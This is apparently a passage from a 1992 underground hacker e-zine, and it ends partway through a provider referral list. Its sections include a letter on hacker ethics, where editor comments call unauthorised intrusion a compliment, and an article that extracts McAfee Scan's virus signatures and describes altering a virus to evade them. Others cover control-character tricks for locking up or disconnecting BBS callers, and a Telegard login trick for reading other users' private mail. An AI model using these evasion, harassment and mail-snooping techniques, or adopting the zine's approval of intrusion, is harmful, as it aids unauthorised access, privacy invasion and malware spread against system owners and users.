I've even been hacked from MIT, a site which has far greater compu-
ting resources than mine.  Why would someone at MIT *need* to hack my
systems, when so much is available to them there?  The only conclu-
sion I can reach is that those hackers do not want to accept respon-
sibility for their actions.  Are you arguing that I have some obli-
gation to condone/support/accept such irresponsibility?

[Editors comment: Perhaps many of today's hackers do not believe in the
hacker ethic of the past. I believe one of the main points of my editorial
was that we should reinforce the hacker ethic. Encourage them to contribute
and be responsible. Perhaps they could perform some sort of service for you
on your machine, in exchange for its use?
    Of course they did not *need* to hack your system. A hacker does not
*need* to do anything. There was probably something about your system
they liked. Consider it a compliment.]

>Current bad mouthing of hackers is simply snobbery.

Hardly; I know that my attitude toward today's hackers comes from my
obligation and responsibility to the owners of my systems, as well as
my obligation to the legitimate users.

[ Editors's comment: You are sounding an awful lot like a suit...]

We had a local hacking incident last year.  After tracking down the
responsible parties, I offered to give them full access to a small
Unix system (an AT&T 3B2/310), with only one condition; they would
be responsible for the actions taken with that system.  None of the
individuals involved wanted to assume responsibility, even though I
was willing to give them root access to a Unix system.

[ Editors comment: ? Got me. I would have taken it. Was it networked? Of
course networked machines are always more interesting.]

>Rather than cracking down on the modern hacker, we
>should reinforce the hacker ethic, a code of conduct not based upon greed and
>lust for the almighty dollar, but instead for personal growth through the free
>access of computers and information, and a respect for technology.

How about adding "respect for the property of others" to that statement?
If I purchased a Porsche, would you assume that you have the "right" to
open up the hood and start tinkering with the engine?  I don't think so.
Why should my purchase of, say, a Convex C240 be treated any differently?

[ Editor's comment: Hmm maybe you are right. Maybe they should not be
treated differently. Where do you park it? :) ]

In closing, let me address the question of resources.  Many hackers have
told me that "they don't have the money for a Unix system"; in fact, this
is often one of their cardinal arguments in defense of their actions.  A
Unix system for 286/386 microcomputers may be purchased for US$99.  I find
it very difficult to believe that these people cannot afford that small
amount of money.  Most of today's hackers would prefer to siphon their
needs from the monies and efforts spent by the owners/operators of other
systems.  They want someone else to fund their "exploration".

[ Editor's comment: The old 'Coherent is just as good as my mainframe'
argument. It is just not the same. Ok, I want to learn VMS. So how about
a $99 VMS clone for my PC?]

My systems are intended for use by a particular group of users; we cannot
fund the needs of the world.  No single site can afford to support everyone.
If I could afford to support such activities, I would set up a public access
system.  I can't afford that, so I expect others to respect my policies.

This entire discussion boils down to a single question, and no one has been
able to provide a suitable answer:
  
  Why should a site be expected to provide access to anyone
  other than those for whom it is purchased/maintained?

Best,
Wes Morgan

--
morgan@ms.uky.edu    |Wes Morgan, not speaking for|     ....!ukma!ukecc!morgan
morgan@engr.uky.edu  |the University of Kentucky's|   morgan%engr.uky.edu@UKCC
morgan@ie.pa.uky.edu |Engineering Computing Center| morgan@wuarchive.wustl.edu
------------------------------------------------------------------------------

[Editor's note: Thanks for your e-mail Wes. And to answer your question, I do
not think a site should be expected to provide access to anyone other than
those for whom it is purchased/maintained. However it would be nice if it
did.]

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

From: gnr@tsf.UUCP (GodNet Raider)
Subject: virus scanner codes.
Organization: The CyberUnderground


               -=[ The 'McAfee scan' viral footprint codes ]=-

                                      -or-

                /*******************************************/
                /* A fool and his scanner, can part a user */
                /*       from his hard earned money.       */
                /*******************************************/

                                - written by -
                                 GodNet Raider
                                    - of -
                             The CyberUnderground

 -=[ "Information is the greatest weapon of power to the modern wizard." ]=-

]----------------------------------------------------------------------------[

Introduction:
-------------

    Recently I began to wonder about the usefulness of 'virus scanners'
and what if any difference do they have with a simple text/hex search
program (like Nortons filefind/ts). And if there was no real DIFFERENCE,
how secure is the system that used them.

Problems with scanning:
-----------------------

    The first question I had to ask was, What does a 'virus scanner' actually
look for? Does it only look for one string of codes or several at different
places in the file?

    To answer this question I called a local BBS an dl'ed McAfee's
Scan3.7v64 (to evaluate and after my tests, it was erased for its lack of
offering any real protection). Then I went to my archives to retrieve some
viruses I have experimented with in the past (of which where Jerusalem B and
Dark Avenger).

    I ran scan to verify that the virus files where viruses (3 of which did
not set off any alarm even tho there was a listing in the documentation for
them, so I removed them from the test). Then using a sector editor looked at
the source for the McAfee asso. Scan3.7v64 (here after know just as Scan64)
to find that the footprint information was encoded. Needless to say this did
not stop me (for the sake of those who are into the tech aspects of things,
the actual method used to get the codes are included at the end of the
article with the codes found), It took less than an hour to get the codes I
was looking for (without disassembling the code but by looking into the
memory allocated to the program).

    What I found out was that Scan was just a simple hex searcher (that kept
its data locked up till needed). It could also be fooled by any program
that contained the same hex string as a real virus (this was proved when,
using a sector editor, I added the Scan64 footprint for the Jerusalem B
into the top of a text file (a place this code would never show up in a real
infection) then renamed it to *.com; Scan64 reported it as infected).

    Once the codes where obtained, using Debug directly on a virus file,
I was able to mutate the virus to no longer be detectable by Scan64 without
destroying the integrity of it. For the virus was still able to infect files,
and Scan64 could no longer track it. I was still able to track and control it
using Norton's filefind, diskmon, diskedit, and (of course) DOS erase.

    So it seems my question was answered. Some 'virus scanners' just scan
for a single string of hex character. This is fine if viruses NEVER changed
or programs would NEVER use code similar to what a virus would (the smaller
the footprint string the bigger the chance of mistaken alarms). For if
a 'virus scanner' programer just keeps making a new release each time there
is a new virus (an I will not get into the morality of charging customers
the full price of an software upgrade rather than allowing them to buy/dl
new footprint data files as they become available) for the program will
eventually grow to unwieldy sizes. An it should be noted there are other
programs that may do the same job faster, more upward compatibility, and
you may already have them on hand.

A possible solution:
--------------------

    One thing that I think is a good idea is when a program allows users
to add new footprint data to it (like Nortons' virus package). For now
users don't need to buy new releases for detection of viruses they may not
get/be able to detect. Instead for the cost of a call to a support bbs (part
of the original software agreement?) the user can get new data as it becomes
available or when they fine a new one on their system they can immediately
add the new footprint rather than wait for the next version to be released.

Method used to obtain footprints:
---------------------------------

    After finding the data I was looking for was encoded I thought, How can
I get the data I wanted for my tests?

    Disassembling was out, not for any MORAL reason but, for the time
involved. So I thought it must have to decode the data for it's own use
and to save time it would do it all before the scan rather than slow the
process down by doing a full decode. So I needed to look at the memory
image of the running program. Thanks to DOS 5.0 and Dosshell I was able to
do this.

    After spawning the scan task under the dos shell I used alt-tab to
swap back to the shell. Once back in the shell I used the shell commands to
copy the ~tmpxxx.swp to foo.img and terminating Scan64 and Dosshell.

    Then using a sector editor I searched though the temp file created by
the dos shell. I found an area of data that contained the virus names and
non ascii text data separating them. Even though the strings of ascii data
(virus names) ended with a zero character (as variable strings have a
tendency to), the random data did not end with a common signal character (as
expected for code can be any character). There was also no character count
stored (the data length varied so it could not be assumed by the scan
program as well). So I continued to search though the data.

    I eventually found another area that had the same text strings (virus
names). This time the first character of the none ascii data gave the count
of the data size to the following text string. I knew I had found it so I
extracted this data to another file (starting at 0 offset in the new file).
Then wrote down the some codes and checked them against viruses I had.

    The codes I had did not seem match. This did not stop me. I took one
virus (that my understanding said scan was only looking for 6 consecutive
bytes to match) and started zapping bytes (in a file scan said was infected)
to find what it was looking for. The processes involved zapping one sector
at a time till scan said it was not infected, then half of that sector, then
half of a half, and so on. It came down to 6 CONSECUTIVE bytes as I expected.
But they where DIFFERENT from the ones I had.

    So I went to the windows calculator (it allows byte arithmetic in hex,
ie.. 0xff + 0x04 = 0x03 (rollover, carry is ignored), it would be outside
the scope of this ARTICLE to explain why I thought byte arithmetic was
important). Some quick subtraction found a 0x93 (decimal 147) DIFFERENCE
between the actual codes and the ones from the allocated memory uses by
scan.

    So taking another virus that scan said was infected I did the minor
hex math on the codes in the allocated memory used by scan and found the
codes. Then i zapped only the codes and ran scan on the updated virus file.
It said there was no infection. I knew I now had the right codes (after a few
more checks).

    So I created a simple C program (see below) to convert the extract file I
 created and converted the codes to a readable form (output from program
listed at end of ARTICLE). Then tested other viruses against the list. An
found the same results.

Binary to hex program:
----------------------

/*
    fp2txt.c
        Convert footprint binary information to text.
            by GodNet Raider

    Notes:
        Please forgive the unrefined/un annotated nature of this code it was
        designed as a one shot.
*/

#include 
#include 

#define TRUE 1
#define MAGICNUM 0x93

void
    main (void);

void main (void)
{
    unsigned char
        sVirusFP [128],
        *ptVirusInfo,
        szVirusName [128];
    register unsigned int
        nTmpCnt;
    FILE
        *Stream;

    Stream = fopen ("fp2.img", "rb");
    while (!feof (Stream))
        {
         ptVirusInfo = sVirusFP;
         if (!(*sVirusFP = getc (Stream)))
             exit (0);
         nTmpCnt = (unsigned int) *sVirusFP;
         while (nTmpCnt--)
             *(++ptVirusInfo) = ((unsigned char) getc (Stream)) - MAGICNUM;
         ptVirusInfo = szVirusName;
         while ((*(ptVirusInfo++) = getc (Stream)));
         printf ("\n%s:\n    ", szVirusName);
         ptVirusInfo = sVirusFP;
         nTmpCnt = (unsigned int) *sVirusFP;
         while (nTmpCnt--)
             {
             printf ("0x%02x ", (unsigned int) *(++ptVirusInfo));
             if (nTmpCnt && !((*sVirusFP - nTmpCnt) % 8))
                printf ("\n    ");
            }
         printf ("\n");
         getc (Stream);
        }
    exit (0);
}


Footprints discovered:
----------------------

    The following is a list of the footprint codes found in McAfee asso.
Scan3.7v64.

    1008 Virus [1008]:
        0x81 0xed 0x38 0x00 0xe8 0xc3

    Stoned-II Virus [S-2]:
        0x9c 0x2e 0xff 0x1e 0x09 0x00

    VHP-2 Virus [VHP2]:
        0x1c 0x8c 0x44 0x02 0xb8 0x24 0x35 0xcd
        0x21 0x89

    VHP Virus [VHP]:
        0x07 0x89 0x7e 0x8a 0x8d 0x7e 0x90 0x89
        0x7e 0x88

    Taiwan3 Virus [T3]:
        0x17 0x0f 0x32 0x0a 0x32 0x0a 0x90 0x0b
        0xfb 0x08

    Armagedon Virus [Arma]:
        0xb8 0x00 0x43 0xcd 0x21 0x2e 0x89 0x0e
        0x48 0x01

    1381 Virus [1381]:
        0x1e 0x06 0x8c 0xc8 0x8e 0xd8 0xb8 0x40
        0x00 0x8e

    Tiny Virus [Tiny]:
        0xb4 0x40 0x8d 0x94 0xab 0x01 0xb9 0x02
        0x00 0xcd

    Subliminal Virus [Sub]:
        0x8b 0x3e 0x25 0x01 0x8b 0xd7 0x2e 0x8e
        0x06 0x27

    Sorry Virus [Sorry]:
        0xeb 0x96 0x83 0x2e 0x12 0x00 0x40 0x83
        0x2e 0x03

    1024 Virus [1024]:
        0xc8 0x75 0xed 0x8b 0xd1 0xb8 0x00 0x42
        0xcd 0x21 0x72

    RedX Virus [RedX]:
        0x52 0x8b 0x9c 0x17 0x04 0xb9 0x19 0x03
        0x8d 0x94

    VP Virus [VP]:
        0x21 0x89 0x1e 0x22 0x03 0x8c 0x06 0x24
        0x03 0xb4

    Print Screen-2 [P-2]:
        0x74 0x01 0xbf 0x03 0x00 0xb9 0x20 0x00
        0xf3 0xa4

    Joshi Virus [Joshi]:
        0xf3 0xa4 0x8c 0xc0 0x05 0x20 0x00 0x8e
        0xc0 0xbb

    Microbes Virus [Micro]:
        0x8e 0xd0 0xbc 0x00 0xf0 0xfb 0xa1 0x13
        0x04 0x2d 0x04

    Print Screen Virus [Prtscr]:
        0xcd 0x05 0xfe 0xc8 0xa2 0x60 0x01 0xc3
        0x6f 0x6e 0x2d

    Form Virus [Form]:
        0xe8 0xb2 0x00 0x5a 0x5e 0x1f 0x33 0xc0
        0x50 0xb8 0x00 0x7c

    June 13th Virus [J13]:
        0x12 0x00 0xb9 0xb1 0x04 0x2e 0x30 0x04
        0x46 0xe2

    JoJo Virus [JoJo]:
        0x4d 0x2b 0xd0 0x4a 0x45 0x03 0xe8 0x45
        0x8e 0xc5

    Victor Virus [Victor]:
        0x74 0x26 0x80 0xfc 0x5b 0x74 0x21 0x80
        0xfc 0x39

    5120 Virus [5120]:
        0x10 0xa2 0xf6 0x0f 0xe8 0xd0 0xfe 0x80
        0x3e 0x4a 0x10 0x02 0x7d 0x22 0xc6 0x46

    W-13 Virus [W13]:
        0xf3 0xa4 0x8b 0xfa 0xb4 0x30 0xcd 0x21
        0x3c 0x00

    Slow Virus [Slow]:
        0x81 0xc6 0x1b 0x00 0xb9 0x90 0x06 0x2e
        0x80 0x34

    Liberty Virus [Liberty]:
        0xe8 0xfd 0xfe 0x72 0x2a 0x3b 0xc1 0x7c
        0x27 0xe8

    Fish Virus [Fish]:
        0x0e 0x01 0xcf 0xe8 0x00 0x00 0x5b 0x81
        0xeb 0xa9

    Shake Virus [Shake]:
        0x31 0xd2 0x8b 0xca 0xcd 0x21 0x3d 0x00
        0xf0 0x73

    Murphy Virus [Murphy]:
        0x81 0x7c 0xfe 0x2e 0x43 0x75 0xed 0xb8
        0x02 0x3d

    V800 Virus [V800]:
        0x51 0xad 0x33 0xd0 0xe2 0xfb 0x59 0x31
        0x15 0x47

    Kennedy Virus [Kennedy]:
        0x8c 0x55 0x02 0xb8 0x01 0x43 0x33 0xc9
        0xcd 0x21

    Yankee Two Virus [Doodle2]:
        0x73 0x03 0x5a 0x5e 0xc3 0x8b 0xf2 0xf6
        0x44 0x15

    1971 Virus [1971]:
        0x33 0xd2 0xb8 0x00 0x42 0xcd 0x21 0x72
        0x26 0x81 0x7c

    June 16th Virus [June16]:
        0x4d 0xa9 0xa5 0x2e 0x70 0x66 0x2e 0x57
        0x09 0x0f

    AIDS II Virus [A2]:
        0xa4 0x00 0x55 0x89 0xe5 0x81 0xec 0x02
        0x02 0xbf 0xca 0x05 0x0e 0x57 0xbf 0x3e
        0x01

    1210 Virus [1210]:
        0xc4 0x74 0xf0 0x2e 0x80 0x3e 0x2f 0x04
        0x01 0x75

    1720 Virus [1720]:
        0xd8 0x2e 0xa1 0x2c 0x00 0xa3 0xfc 0x03
        0x2e 0xa0

    Saturday 14th Virus [Sat14]:
        0x0e 0x1f 0xb8 0x24 0x35 0xcd 0x21 0x8c
        0x06 0x6f

    XA1 (1539) Christmas Virus [XA1]:
        0xfa 0x8b 0xec 0x58 0x32 0xc0 0x89 0x46
        0x02 0x81

    1392 (Amoeba) Virus [1392]:
        0x16 0xa3 0x21 0x01 0x8b 0x44 0x14 0xa3
        0x23 0x01

    Vcomm Virus [Vcomm]:
        0x77 0x02 0xb9 0x20 0x00 0xb4 0x4e 0xcd
        0x21

    ItaVir Virus [Ita]:
        0xb8 0x58 0x45 0x89 0x40 0x02 0xb0 0x00
        0x88 0x40 0x04

    Korea Virus [Korea]:
        0x8e 0xd0 0xbc 0xf0 0xff 0xfb 0xbb 0x13
        0x04

    Solano Virus [Solano]:
        0x12 0x75 0x0e 0x2e 0x8b 0x0e 0x03 0x01

    V2000 Virus [2000]:
        0x51 0xe8 0x39 0xfd 0x8e 0xc3 0x26 0x8b

    12 Tricks Trojan [Tricks]:
        0x64 0x02 0x31 0x94 0x42 0x01 0xd1 0xc2
        0x4e 0x79 0xf7

    12 Tricks Trojan [Tricks-B]:
        0xe4 0x61 0x8a 0xe0 0x0c 0x80 0xe6 0x61

    1559 Virus [1559]:
        0x03 0x26 0x89 0x1e 0x92 0x00 0xfb 0xc3
        0x50 0x53 0x51 0x52 0x06

    512 Virus [512]:
        0x01 0x8c 0x45 0x70 0x1f 0x89 0x57 0x14
        0x8c 0xca 0x8e 0xda

    EDV Virus [EDV]:
        0x75 0x1c 0x80 0xfe 0x01 0x75 0x17 0x5b
        0x07 0x1f 0x58 0x83

    Icelandic-3 Virus [Ice-3]:
        0x24 0x2e 0x8f 0x06 0x3b 0x03 0x90 0x2e
        0x8f 0x06

    Perfume Virus [Fume]:
        0x04 0x06 0xbf 0xba 0x00 0x57 0xcb 0x0e
        0x1f 0x8e 0x06

    Joker Virus [Joke]:
        0x56 0x07 0x45 0x07 0x21 0x07 0x1d 0x49
        0x27 0x6d 0x20 0x73 0x6f 0x20 0x6d 0x75
        0x63

    Virus-101 [101]:
        0xb3 0x01 0xb4 0x36 0x70 0xb7 0x01 0xb4
        0x36 0x70 0x8b 0x37 0xb4 0x36 0x70 0xb3
        0x03 0xb4 0x36 0x70 0x03 0xf3 0xb4

    Halloechen Virus [Hal]:
        0x8c 0xd0 0x8b 0xd4 0xbc 0x02 0x00 0x36
        0x8b 0x0e

    Taiwan Virus [Taiwan]:
        0x8a 0x0e 0x95 0x00 0x81 0xe1 0xfe 0x00
        0xba 0x9e

    Oropax Virus [Oro]:
        0x3e 0x01 0x1d 0xf2 0x77 0xd1 0xba 0x00

    Chaos Virus [Chaos]:
        0xa1 0x49 0x43 0x68 0x41 0x4f 0x53 0x50
        0x52 0x51 0xe8

    4096 Virus [4096]:
        0xf6 0x2e 0x8f 0x06 0x41 0x12 0x2e 0x8f
        0x06 0x43

    Virus-90 [90]:
        0x81 0xb8 0xfe 0xff 0x8e 0xd8 0x2d 0xcc

    AIDS Information Trojan [Aids]:
        0x31 0x30 0x30 0x2c 0x36 0x32 0x2c 0x33
        0x32 0x00

    Devil's Dance Virus [Dance]:
        0x5e 0x1e 0x06 0x8c 0xc0 0x48 0x8e 0xc0
        0x26

    Amstrad Virus [Amst]:
        0x72 0x02 0xeb 0x36 0x76 0xba 0x80 0x00
        0xb4 0x1a 0xcd 0x21 0x80 0x3e

    Datacrime II-b Virus [Crime-2B]:
        0x2e 0x8a 0x07 0x32 0xc2 0xd0 0xca 0x2e

    Holland Girl Virus [Holland]:
        0x36 0x03 0x01 0x33 0xc9 0x33 0xc0 0xac

    Do Nothing Virus [Nothing]:
        0x72 0x04 0x50 0xeb 0x07 0x90 0xb4 0x4c

    Lisbon Virus [Lisb]:
        0x8b 0x44 0x79 0x3d 0x0a 0x00 0x72 0xde

    Sunday Virus [Sunday]:
        0x75 0x10 0x07 0x2e 0x8e 0x16 0x45 0x00
        0x2e 0x8b

    Typo COM virus [Typo]:
        0x99 0xfe 0x26 0xa1 0x5a 0x00 0x2e 0x89

    DBASE Virus [Dbase]:
        0x80 0xfc 0x6c 0x74 0xea 0x80 0xfc 0x5b
        0x74 0xe5

    Ghost Virus :
        0x90 0xea 0x59 0xec 0x00 0xf0 0x90 0x90

    Jerusalem Virus Strain B [Jeru]:
        0x47 0x00 0x33 0xc0 0x8e 0xc0 0x26 0xa1
        0xfc 0x03

    Alabama Virus [Alabama]:
        0x8f 0x06 0x18 0x05 0x26 0x8f 0x06 0x1a

    1701/1704 Virus - Version B [170X]:
        0x31 0x34 0x31 0x24 0x46 0x4c

    Datacrime Virus [Crime]:
        0x36 0x01 0x01 0x83 0xee 0x03 0x8b 0xc6
        0x3d 0x00

    Stoned Virus [Stoned]:
        0x00 0x53 0x51 0x52 0x06 0x56 0x57 0xbe

    Vacsina virus [Vacs]:
        0xb8 0x01 0x43 0x8e 0x5e 0x0e 0x8b 0x56
        0x06 0x2e

    Den Zuk Virus :
        0x8e 0xc0 0xbe 0xc6 0x7c 0xbf 0x00 0x7e

    Ping Pong Virus (old string):
        0x59 0x5b 0x58 0x07 0x1f 0xea

    Pakistani Brain Virus [Brain]:
        0x8e 0xd8 0x8e 0xd0 0xbc 0x00 0xf0 0xfb
        0xa0 0x06

    Yale/Alameda Virus [Alameda]:
        0xb4 0x00 0xcd 0x13 0x72 0x0d 0xb8 0x01

    Lehigh Virus [Lehigh]:
        0x5e 0x83 0xee 0x03 0x8b 0xde 0x81 0xeb
        0x91 0x01

    Pakistani Brain/Ashar Virus [Brain]:
        0x20 0x8c 0xc8 0x8e 0xd8 0x8e 0xd0

    Fu Manchu Virus - Version A [Fu]:
        0x26 0xc7 0x06 0xfc 0x03 0xf3 0xa4 0x26
        0xc6 0x06

    Ping Pong Virus - Version B [Ping]:
        0@xa1 0@xf5 0x81 0@xa3 0@xf5 0x7d 0x8b 0x36
        0xf9 0x81

    1536 (Zero Bug) Virus [Zero]:
        0xeb 0x2b 0x90 0x5a 0x45 0xcd 0x60 0x2e

    Vienna (DOS 62) Virus - Version B [Vienna]:
        0x8b 0@xfe 0x36 0x6f 0xc7 0x1f 0x36 0x6f
        0x8b 0@xde 0x36 0x6f 0xc6 0x1f

    Ghost Version of DOS-62 [Ghost-C]:
        0x8e 0xd8 0@xa1 0x13 0x04 0x2d 0x02 0x00
        0x90 0xa3 0x13

    Friday 13th Virus [@Fri13]:
        0xb4 0x4f 0xcd 0x21 0x73 0@xf7 0x58

    405 virus [405]:
        0x19 0xcd 0x21 0x26 0xa2 0x49 0x02 0xb4
        0x47 0x04 0x01 0x50

    3066/2930 Traceback Virus [3066]:
        0x14 0x8b 0x4d 0x16 0x8b 0xc1 0x8a 0xcd

    Pentagon Virus :
        0xeb 0x34 0x90 0x48 0x41 0x4c 0x20 0x20

    Israeli Boot Virus:
        0xcd 0x13 0xb8 0x02 0x02 0xb9 0x06 0x27
        0xba 0x00 0x01

    Typo Boot Virus:
        0x24 0x13 0x55 0xaa

    Datacrime-2 Virus [Crime-2]:
        0x8a 0x94 0x03 0x01 0x8d 0xbc 0x29 0x01
        0x8d 0x8c 0xea 0x06

    Ohio Virus:
        0xeb 0x29 0x90 0x49 0x34 0x12 0x00 0x01
        0x00 0x00 0x00 0x00

    3551 (Syslock) Virus [Syslock]:
        0x33 0x06 0x14 0x00 0x31 0x04 0x46 0x46
        0xe2 0xf2

    Dark Avenger virus [Dav]:
        0xa1 0x4f 0x07 0x89 0x07 0x2e 0xa1 0x51

    MIX1/Icelandic Virus [Ice]:
        0x43 0x81 0x3f 0x45 0x58 0x75 0xf1 0xb8
        0x00 0x43

    Disk Killer Virus [Killer]:
        0xc3 0x10 0xe2 0xf2 0xc6 0x06 0xf3 0x01
        0xff 0x90 0xeb 0x55

    AIDS Virus [Taunt]:
        0x42 0xe8 0xef 0xe3 0xbf 0xca 0x03 0x1e

    Yankee Doodle Virus [Doodle]:
        0x35 0xcd 0x21 0x8b 0xf3 0x8c 0xc7

    Suriv A Virus [SurivA]:
        0x90 0x73 0x55 0x52 0x49 0x56 0x00

    Suriv B Virus [SurivB]:
        0x00 0x73 0x55 0x52 0x49 0x56 0x00

]============================================================================[
--
 ...uunet!underg!tsf!gnr (GodNet Raider)
 -=[ "Information is the greatest weapon of power to the modern wizard." ]=-
         -=[ "You gotta learn to listen, before you learn to play." ]=-

[ Editor's note: This was recently posted to alt.hackers, and comp.viruses
 and is republished for those who missed it, or do not have access to Usenet,
 and for archival purposes. A more devious mind could think of all sorts of
 fun using this information, like fake virus programs, etc. The scan
 signatures themselves are not dangerous.]

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

                        Phun With Character Codes
                              by The BBC

    Sunny day... Bringing the clouds your way... On your way to where
the minds aren't clean.......... Can you tell us how to get... How
to get to Hackers street... How to get to Hackers street... How to
get to Hackers street.........

    Today on Hackers street... We learn about the control letters...
S... and G... An the number....... 0....

    Hello kiddies, An what a dreary day in the neighborhood... [Oops
sorry wrong show]..... Well any way welcome to Hackers street... We
are your good friends The BBC... Today we thought.... Why look there
is Big Hackbird, an he looks depressed, lets find out why...

    Hackbird Why so down... 'Well BBC it seems that all the
users\sysop stoped using ANSI [AAAAHHHHHHHH] on their systems'...
'Now I can't make problem messages'... 'What is a Hackbird to do'...
Never fear, Hackbird, The BBC is here... Have we ever let you down
before??? 'Well yes, there was that time you dropped me and a short
sysop from the world trade center to prove that all objects fall at
the same rate on last weeks show and...' [Smack] Well anyway...

    So today then we will learn [Thanks to the new feature of some
boards that let users [and hackers] upload messages using protocols
other than ascii]... Yes now you can imbed into messages special
chars. that can not be typed in, in some cases... Three of which
are... ^G, ^S, and the null char. [0x00]... An what nasty little
things they could be used for... Not that We would even suggest
such things...

    First we will talk about ^G [0x07] better know as the bell
char.... 'Me, know about bell. Noisy, don't like'... 'But it bother
ears to put in and some boards don't take'... 'An what is few beep
anyway'...That is true Crashy monster... But, Remember there are now
boards that let us upload large messages... An we are no longer
talking a few beeps but instead a few thousand beeps... For till a
paused is reached [80 * 24 or 1920 chars. in some cases] a person
must listen to our lil' musical... Crash in 'c' minor... 'Yes, me
see... Me like, me like'... Well if you liked that you will love
what comes next... But first would like to help us test something...
'Ya, Ya what... New Virus, Trojan, Password cracker'... No just this
new trap door and spiked pit... 'What spiked... AHHHHHHHHhhhhhh
[Splat]'...

    'Yes, this is Kermit t. Protocol reporting from BBC labs'...
Today they are hard at work with their new toy ^S [0x13]...
'Professor BBC tell us about this ^S'... Well lil' green buddy it is
the infamous Xoff char.... It is used to signal the remote not to
send anymore chars. till a ^Q [0x11 (Xon)] is received... What this
will do is make the caller think his keyboard is locked for what he
types is not sent... Ohhhh if they have any brains they will hit
the ^Q manually but don't expect much... An to put a few of these
in a message will cause a bit of a problem... An the quote features
will carry them forward as well.. 'That is nice, what else is BBC
labs working on'... We are glad you asked... We have branched out
into the realm of comedy... Like over here is out latest joke... How
would you like to be part of this great experiment kermy... 'Well I
guess... what the blender for?'... Ok, Ready... What is green and
red n' goes 120 MPH... 'I don't know... Hey! What are you doing...'
.. Kermit t. Protocol in a blender... [BUZZZZZZZZZZZ]
'Ahhhhhhhhhhhhhhhhhh...

    Finally kiddies, Grover the pirate will help us with... 'Yes! I
Grover the pirate will help the BBC with their talk about...'
Groovy... Now, you want to be in next weeks show, right... 'Well
yes.. but why wouldn't I'... Well you could meet with a nasty
mishap... 'What kind of mishap?'... Well like someone could hit this
rope with a knife [Snap]... 'So'... Well that rope supported a 16
ton weight over your head... 'What 16 to....[Splat]'... Now kids we
hope you learned from this, an remember never play with knives near
ropes attached to 16 ton weights... Well now that we will not be
bothered... The Null char. [0x00] is a funny little thing in that
some BBS software will not send it in ansii mode... So you ask what
good is a char. like that... Well there may come the time you need a
timer... a way to make the host wait a few seconds after sending a
group of chars. like an Attention signal [in most cases '+++']...
For to get a message to the host modem you must sent an attention
signal then wait about 3 seconds before sending the hangup command
[ATH0] to have the users session bail out in mid message... Of
course you will have to send about 5 pages worth [no line returns]
of this char. to get the right delay... But thank to the non ascii
upload method this will be easy... An we would hope you will not use
this to send an hangup followed by a call command to a 900 number...
That would be most evil... An you may grow up to be scum like...

The BBC
----------------------------------------------------------------------
 ...uunet!underg!tsf!bbc (The BBC)
             -=[ "Anarchy is never HAVING to say you're sorry." ]=-
----------------------------------------------------------------------

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

To: hackers@underg.UUCP
Subject: All I want is to be is in DFP #3
From: hardrock@underg.UUCP (hard rock)
Date: Wed, 15 Apr 92 18:13:56 EDT
Organization: Underground Computing Foundation

******************************************************************
**      WAY TO READ OTHER PEOPLE'S MAIL ON TELEGARD BBS!        **
******************************************************************

Well a friend of yours or maybe a enemy, well who ever this person
is, is a regular caller of the BBS type Telegard v2.7.  You out of
normal curious nature, would like to know what he is writing about
to the other babes on the system.  Well a couple of ways can be
used, some legal some not:

A) Break into the sysop's house when he/she is at work, or on
     vacation and just reading, hoping the neighbors didn't hear
     you use TNT to break down the door.  This method can be
     somewhat dangerous, but still possible.

B) Find out the working schedule of the sysop and when he/she is
     not home, spend it trying to hack out the privileged accounts.
     This could get kind of boring or tiring after a while.  Also,
     if you are a *real* hacker, you live on pizza and chips.  Well
     the chip company and local pizza joint will be getting a lot
     of your drug money.

C) Use the method I am going to tell you.  Can be a little tedious,
     if you want to read a lot of mail from different users.

D) And any other scummy forms of hacking.

Well, I feel the most logical one is 'C'.  Well to get down to how
to do it, first you must find out the full alias used by the
victim.  For example:  Let me pick a name randomly out of my head,
well how about 'TWO FACE'.   Hey, no booing allowed!!!   What I
mean by FULL ALIAS, is don't try it will TWO or 2FACE, basically
use that thing between your ears.  With this name, you would try
to log on as 'TWO FACE2' or 'TWO FACE1'.  The object is to make
sure a character follows the real name.  It will allow you to log
on, after the logon, go to the message section and start reading.

The reason this works is because, simple:  In the message section
the computer looks at the first message FROM:Peter Pan TO:Killer
Bee.  Your name, TWO FACE2, doesn't start with a P or a K so it
skips that message.  The next message it looks at, FROM:Amy Lowell
TO:TWO FACE.  The 'T''W''O'' ''F''A''C''E'' is all equal.  It
allows you to read it.  It doesn't check to see that you have a
extra character.

Well enjoy, this small but useful hack.  I will be reporting if
this works on other BBS systems.  Maybe, PCBoard has a small error
like this.  (c)1992 Hard Rock


* * * * * * * * * * * * * * * NOTE * * * * * * * * * * * * * * *
I am NOT in any way responsible for you getting you ass screwed
because you attempt to mess around with some local subscription
system.  Don't say to the sysop or cops, well it was HARD ROCK,
yeah that dude who wrote the document.  LAST TIME: THIS IS FOR
INFORMATION USE ONLY!!!

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

                          The NNSC Info Server
                              by Max Cray

The National Science Foundation Network Service Center (NNSC) operates
the Info-Server for the purpose of providing important Internet
documents by email.

To order the help document, Send a message to info-server@nnsc.nsf.net.
The Subject field does not matter and may be omitted. Place the
following text in the body of the message:

  request: info
  topic: help


For example, this document can be obtained from this service:

------------------------------------------------------------------------------

                     NETWORK PROVIDER REFERRAL LIST
                    NSF Network Service Center (NNSC)
                             13 April 1992

The NSF Network Service Center (NNSC) often receives the initial calls from
sites wishing to connect to the Internet.  The NNSC refers such callers to
the appropriate contacts for any networks which might be able to serve them.
The current list of contacts used by NNSC for this purpose follows. If you
have any updates or corrections to this information, please send a message
to nnsc@nnsc.nsf.net.

-------------------------------------------------------------------------
Network   Service Area
  Contact Name  Phone Number  Mail Address
-------------------------------------------------------------------------
Providers Based in the United States of America
-------------------------------------------------------------------------

Alternet  US and International
  UUNET     (800) 4UUNET3 alternet-info@uunet.uu.net

ANS   US and International
  Joel Maloff (313) 663-7610  maloff@nis.ans.net

BARRNET   Bay Area, California (CA)
  William Yundt (415) 723-3104  gd.why@forsythe.stanford.edu

CERFnet   Western US and International
  CERFnet Hotline (800) 876-2373  help@cerf.net

CICnet    Midwest US (MN, WI, IA, IN, IL, MI, OH)
  John Hankins  (313) 998-6102  hankins@cic.net

CO Supernet Colorado (CO)
  Ken Harmon  (303) 273-3475  kharmon@csn.org

CONCERT   North Carolina (NC)
  Joe Ragland (919) 248-1404  jrr@concert.net

International Connections Manager (ICM) International
  Robert Collet (703) 904-2230  rcollet@icm1.icp.net

INet    Indiana (IN)
